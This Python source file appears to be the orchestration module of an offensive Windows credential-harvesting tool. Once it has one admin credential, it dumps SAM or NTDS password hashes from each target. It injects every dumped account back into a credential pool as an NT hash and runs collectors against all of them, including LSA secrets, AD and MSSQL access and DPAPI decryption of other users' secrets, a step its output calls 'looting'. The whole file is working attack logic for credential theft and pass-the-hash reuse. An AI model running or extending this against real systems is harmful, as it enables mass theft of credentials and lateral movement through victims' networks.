"""Orchestrator: targets x collectors x credential-pool (scoped per host).

A pre-flight (core.authcheck) validates every cred against each open service and
resolves the working auth mode. That matrix is used ONLY to (a) skip what is 100%
impossible - a closed port, not a DC, no local-admin for an admin-only collector -
and (b) hint the right auth mode. It NEVER pre-filters which creds a collector may
try: a finding must never be lost because the auth-check guessed wrong, so each
collector is handed every relevant cred (validated-first) and is the final judge.
The full supplied pool is also handed over (pool_creds) so DPAPI collectors can
decrypt other users' masterkeys even when auth is admin-only.

per_credential == False  (SAM/LSA, nxc, AD): try creds until one works, then stop.
per_credential == True   (DPAPI/dploot): try ALL creds (each may decrypt a
                          different user's blobs); aggregate everything.

AUTOPOOL (default on, disable with autopool=False):
  Before the normal collector pass, on a host we are admin on, dump the account
  database first - NTDS (domain users) on a DC, local SAM on a member/standalone
  host - and feed every dumped user back into the credential pool as a
  user#nthash credential. Those accounts are valid by definition (they came out
  of the DB), so they need no pre-auth check; every downstream collector then
  runs against ALL of them automatically. In practice this mainly widens DPAPI
  decryption (dploot --nthashes decrypts each user's masterkeys), so the user
  only has to supply one admin credential. SAM hashes are injected host-scoped +
  local; NTDS hashes are injected domain-wide. Junk accounts are filtered out
  (krbtgt, Guest / blank-password hash, machine accounts ending in '$').
"""
from __future__ import annotations

import os
import sys
import time
from typing import List, Optional, Set, Type

from . import authcheck
from .authcheck import SMB, MSSQL, LDAP
from .credential import Credential, CredentialPool
from .secret import Secret
from .tools import find_tool, tcp_open
from collectors.base import BaseCollector
from collectors.sam_lsa import SamLsaCollector
from collectors.dc import NtdsCollector

# NT hash of the empty password - a blank/disabled account (e.g. Guest); never
# worth injecting into the pool.
EMPTY_NT = "31d6cfe0d16ae931b73c59d7e0c089c0"


def _log(msg: str) -> None:
    print(f"[*] {msg}", file=sys.stderr)


def _wait_reachable(host: str, line, active) -> None:
    """Pause the scan while the target is unreachable (e.g. tunnel dropped) and
    resume once it comes back. Ctrl-C aborts the whole run."""
    if tcp_open(host, 445, 2):
        return
    line(f"[yellow]!! lost connection to {host} - waiting for reconnect "
         f"(Ctrl-C to abort)[/yellow]")
    while True:
        active(f"{host}  waiting for reconnect...")
        time.sleep(5)
        if tcp_open(host, 445, 2):
            line(f"[green]** reconnected to {host}, continuing[/green]")
            return


def _cred_from_dump(raw_user: str, nthash: str, dump_domain: str,
                    local: bool, host: str) -> Optional[Credential]:
    """Turn one dumped 'user:...:nthash:::' entry into a pool Credential, or None
    if it is not worth injecting. SAM dumps -> local + host-scoped; NTDS dumps ->
    domain-wide (host=None)."""
    if not nthash or nthash.lower() == EMPTY_NT:
        return None                       # blank-password account (e.g. Guest)
    user = raw_user
    domain = "" if local else dump_domain
    if "\\" in user:                      # "DOMAIN\user" form from NTDS output
        d, user = user.split("\\", 1)
        if not local:
            domain = d
    low = user.lower()
    if low in ("guest", "krbtgt"):
        return None                       # never useful / must never be sprayed
    if user.endswith("$"):
        return None                       # machine account - noise for auth collectors
    return Credential(username=user, domain=domain, nthash=nthash,
                      local=local, host=(host if local else None))


def _already_in_pool(pool: CredentialPool, cred: Credential) -> bool:
    for c in pool:
        if (c.username.lower() == cred.username.lower()
                and (c.nthash or "").lower() == (cred.nthash or "").lower()
                and c.local == cred.local and c.host == cred.host):
            return True
    return False


def _harvest_pool(host: str, matrix: "authcheck.AuthMatrix", pool: CredentialPool,
                  collectors: List[Type[BaseCollector]], raw_dir: str, timeout: int,
                  verbose: bool, line, active, results: List[Secret]) -> Set[str]:
    """Dump the account DB (NTDS on a DC, SAM otherwise), merge its findings into
    results, and inject every dumped user into the pool. Returns the set of
    collector names it ran so the main loop can skip re-running them."""
    done: Set[str] = set()
    if not matrix.has_admin(host):
        return done                        # need local-admin to dump anything
    is_dc = matrix.port_open(host, LDAP)
    Col = NtdsCollector if is_dc else SamLsaCollector
    src_ok = ("NTDS",) if is_dc else ("SAM",)
    scope_local = not is_dc
    if Col not in collectors:
        return done                        # respect --only/--skip
    if [t for t in Col.requires if not find_tool(t)]:
        return done                        # dump tool missing
    admin_creds = matrix.admin_creds(host)
    if not admin_creds:
        return done

    active(f"{host}  harvest {Col.name} -> pool")
    eff_timeout = min(timeout, Col.max_timeout) if Col.max_timeout else timeout
    col = Col(host=host, raw_dir=raw_dir, timeout=eff_timeout, verbose=verbose,
              creds=list(admin_creds), pool_creds=list(pool.for_host(host)))
    got: List[Secret] = []
    dump_domain = ""
    for cred in admin_creds:
        if verbose:
            _log(f"{host} harvest {Col.name} <- {cred.label}")
        part = col.collect_once(cred)
        if part:
            got += part
            dump_domain = cred.domain      # tag bare NTDS users with this domain
            break
    n = _merge(results, got)
    mark = f"[green]{n:>3}[/green]" if n else f"{n:>3}"
    line(f"   {Col.name:<12} {mark} finding(s) (harvest)")
    done.add(Col.name)

    added = 0
    for s in got:
        if s.secret_type != "nthash" or s.source not in src_ok:
            continue
        nc = _cred_from_dump(s.username, s.secret, dump_domain, scope_local, host)
        if nc is None or _already_in_pool(pool, nc):
            continue
        pool.add(nc)
        added += 1
    if added:
        line(f"   {'autopool':<12} [green]+{added}[/green] cred(s) from {Col.name} "
             f"-> all downstream collectors will test them")
    return done


def run_all(targets: List[str], pool: CredentialPool,
            collectors: List[Type[BaseCollector]], out_dir: str,
            timeout: int = 300, verbose: bool = False,
            autopool: bool = True) -> List[Secret]:
    results: List[Secret] = []

    console = None
    status = None
    if not verbose:
        try:
            from rich.console import Console
            console = Console(stderr=True)
            status = console.status("[bold green]starting...", spinner="line")
            status.start()
        except Exception:
            console = None

    def line(msg: str) -> None:
        """A progress line that stays on screen (printed above the live spinner)."""
        if console is not None:
            console.print(msg, highlight=False)
        else:
            print(msg, file=sys.stderr)

    def active(msg: str) -> None:
        if status is not None:
            status.update(f"[bold green]{msg}")

    try:
        # Pre-flight: validate creds against each service and resolve the auth
        # mode that works. Used only for gating + mode hints, never to drop creds.
        matrix = authcheck.build(targets, pool, line, active)
        _merge(results, authcheck.access_findings(matrix))   # supplied creds that work

        for host in targets:
            line(f"[bold]== {host} ==[/bold]" if console else f"== {host} ==")

            raw_dir = os.path.join(out_dir, "raw", host.replace(":", "_"))

            # AUTOPOOL: dump the account DB first and inject the users into the
            # pool, so every collector below runs against them too. Done before
            # host_pool is snapshotted so the injected creds flow into pool_creds.
            harvested: Set[str] = set()
            if autopool:
                harvested = _harvest_pool(host, matrix, pool, collectors, raw_dir,
                                          timeout, verbose, line, active, results)

            host_pool = list(pool.for_host(host))        # full pool (incl. injected)

            for Col in collectors:
                if Col.name in harvested:
                    continue                             # already run in harvest phase

                missing = [t for t in Col.requires if not find_tool(t)]
                if missing:
                    line(f"   {Col.name:<12} skipped (missing {','.join(missing)})")
                    continue

                svc = Col.auth_service

                # DC / service-port gates (the only "100% impossible" skips)
                if Col.needs_ldap and not matrix.port_open(host, LDAP):
                    line(f"   {Col.name:<12} skipped (no LDAP - not a DC)")
                    continue
                if Col.needs_mssql and not matrix.port_open(host, MSSQL):
                    line(f"   {Col.name:<12} skipped (no MSSQL on target)")
                    continue
                if not matrix.port_open(host, svc):
                    line(f"   {Col.name:<12} skipped (no {svc.upper()} on target)")
                    continue

                # pick the creds to run with. RULE: never drop a finding because
                # of the auth-check - only skip when it is 100% impossible.
                if Col.needs_admin or Col.needs_admin_dc:
                    # needs local-admin: skip ONLY if no supplied cred is admin
                    if not matrix.has_admin(host):
                        line(f"   {Col.name:<12} skipped (no local-admin on target)")
                        continue
                    use_creds = matrix.admin_creds(host)
                else:
                    # non-admin service (smb/ldap/mssql): the port is open, so RUN
                    # with every supplied cred (validated-first, right mode), and
                    # let the collector be the final judge. Never pre-filter here.
                    use_creds = matrix.service_creds(host, svc, host_pool)
                    if not use_creds:
                        line(f"   {Col.name:<12} skipped (no credentials supplied)")
                        continue

                _wait_reachable(host, line, active)
                active(f"{host}  looting  {Col.name}")
                eff_timeout = min(timeout, Col.max_timeout) if Col.max_timeout else timeout
                col = Col(host=host, raw_dir=raw_dir, timeout=eff_timeout,
                          verbose=verbose, creds=list(use_creds), pool_creds=host_pool)
                got: List[Secret] = []

                if Col.per_credential:
                    for cred in use_creds:
                        if verbose:
                            _log(f"{host} {Col.name} <- {cred.label}")
                        got += col.collect_with_cred(cred)
                else:
                    for cred in use_creds:
                        if verbose:
                            _log(f"{host} {Col.name} <- {cred.label}")
                        part = col.collect_once(cred)
                        if part:
                            got += part
                            break

                n = _merge(results, got)
                mark = f"[green]{n:>3}[/green]" if (console and n) else f"{n:>3}"
                line(f"   {Col.name:<12} {mark} finding(s)")
    finally:
        if status is not None:
            status.stop()

    return results


def _merge(acc: List[Secret], new: List[Secret]) -> int:
    existing = {s.key() for s in acc}
    added = 0
    for s in new:
        if s.key() in existing:
            continue
        existing.add(s.key())
        acc.append(s)
        added += 1
    return added
